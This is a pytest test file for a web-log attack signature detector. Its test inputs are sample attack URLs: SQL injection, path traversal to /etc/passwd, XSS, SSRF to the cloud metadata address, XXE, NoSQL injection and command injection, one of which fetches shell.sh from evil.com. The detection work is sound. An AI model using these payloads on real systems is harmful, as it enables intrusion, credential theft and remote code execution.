"""
Tests for attack signature detection
"""

from weblog_hunter.signatures import SignatureDetector


class TestSignatureDetector:
    """Test the SignatureDetector class"""

    def test_detect_sqli_union(self):
        """Test SQLi UNION detection"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/admin.php?id=1 UNION SELECT * FROM users")
        assert "SQLi" in attacks

    def test_detect_sqli_or(self):
        """Test SQLi OR 1=1 detection"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/login.php?user=admin' OR 1=1--")
        assert "SQLi" in attacks

    def test_detect_sqli_sleep(self):
        """Test SQLi SLEEP detection"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/page.php?id=1' AND SLEEP(5)--")
        assert "SQLi" in attacks

    def test_detect_traversal_dotdot(self):
        """Test path traversal with ../"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/download.php?file=../../etc/passwd")
        assert "Traversal/LFI" in attacks

    def test_detect_traversal_encoded(self):
        """Test encoded path traversal"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/file.php?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd")
        assert "Traversal/LFI" in attacks

    def test_detect_xss_script(self):
        """Test XSS with script tag"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/search.php?q=<script>alert(1)</script>")
        assert "XSS" in attacks

    def test_detect_xss_onerror(self):
        """Test XSS with onerror"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/comment.php?text=<img src=x onerror=alert(1)>")
        assert "XSS" in attacks

    def test_detect_ssrf_internal_ip(self):
        """Test SSRF with internal IP"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/proxy.php?url=http://169.254.169.254/latest/meta-data/")
        assert "SSRF" in attacks

    def test_detect_ssrf_localhost(self):
        """Test SSRF with localhost"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/fetch.php?url=http://localhost:8080/admin")
        assert "SSRF" in attacks

    def test_detect_cmdi_cat(self):
        """Test command injection with cat"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/exec.php?cmd=cat /etc/passwd")
        assert "CMDi/Shell" in attacks

    def test_detect_cmdi_wget(self):
        """Test command injection with wget"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/shell.php?cmd=wget http://evil.com/shell.sh")
        assert "CMDi/Shell" in attacks

    def test_detect_rce_eval(self):
        """Test RCE with eval"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/page.php?code=eval($_GET['cmd'])")
        assert "RCE" in attacks

    def test_detect_xxe(self):
        """Test XXE detection"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/xml.php?data=<!ENTITY xxe SYSTEM 'file:///etc/passwd'>")
        assert "XXE" in attacks

    def test_detect_nosql_injection(self):
        """Test NoSQL injection detection"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/api/users?filter[$ne]=null")
        assert "NoSQL Injection" in attacks

    def test_detect_multiple_attacks(self):
        """Test detection of multiple attack types"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks(
            "/admin.php?id=1' UNION SELECT '<script>alert(1)</script>' FROM users"
        )
        assert "SQLi" in attacks
        assert "XSS" in attacks

    def test_no_attacks_clean_url(self):
        """Test that clean URLs don't trigger false positives"""
        detector = SignatureDetector()
        attacks = detector.detect_attacks("/products.php?category=electronics&sort=price")
        assert len(attacks) == 0


class TestToolDetection:
    """Test tool detection from user agents"""

    def test_detect_sqlmap(self):
        """Test sqlmap detection"""
        detector = SignatureDetector()
        tool = detector.detect_tool("sqlmap/1.0")
        assert tool == "sqlmap"

    def test_detect_nikto(self):
        """Test nikto detection"""
        detector = SignatureDetector()
        tool = detector.detect_tool("nikto/2.1.6")
        assert tool == "nikto"

    def test_detect_curl(self):
        """Test curl detection"""
        detector = SignatureDetector()
        tool = detector.detect_tool("curl/7.68.0")
        assert tool == "curl"

    def test_detect_python_requests(self):
        """Test python-requests detection"""
        detector = SignatureDetector()
        tool = detector.detect_tool("python-requests/2.25.1")
        assert tool == "python-requests"

    def test_detect_browser(self):
        """Test browser detection"""
        detector = SignatureDetector()
        tool = detector.detect_tool("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/96.0")
        assert tool == "browser"

    def test_detect_bot(self):
        """Test bot detection"""
        detector = SignatureDetector()
        tool = detector.detect_tool("Googlebot/2.1")
        assert tool == "bot"

    def test_empty_user_agent(self):
        """Test empty user agent"""
        detector = SignatureDetector()
        tool = detector.detect_tool("")
        assert tool is None


class TestEndpointClassification:
    """Test endpoint classification methods"""

    def test_is_api_endpoint(self):
        """Test API endpoint detection"""
        detector = SignatureDetector()
        assert detector.is_api_endpoint("/api/users") is True
        assert detector.is_api_endpoint("/rest/products") is True
        assert detector.is_api_endpoint("/graphql") is True
        assert detector.is_api_endpoint("/index.php") is False

    def test_is_sensitive_endpoint(self):
        """Test sensitive endpoint detection"""
        detector = SignatureDetector()
        assert detector.is_sensitive_endpoint("/admin/users") is True
        assert detector.is_sensitive_endpoint("/export/data") is True
        assert detector.is_sensitive_endpoint("/backup.sql") is True
        assert detector.is_sensitive_endpoint("/about.html") is False

    def test_has_session_parameter(self):
        """Test session parameter detection"""
        detector = SignatureDetector()
        assert detector.has_session_parameter("/page.php?sessionid=123") is True
        assert detector.has_session_parameter("/app.php?PHPSESSID=abc") is True
        assert detector.has_session_parameter("/index.php?page=home") is False
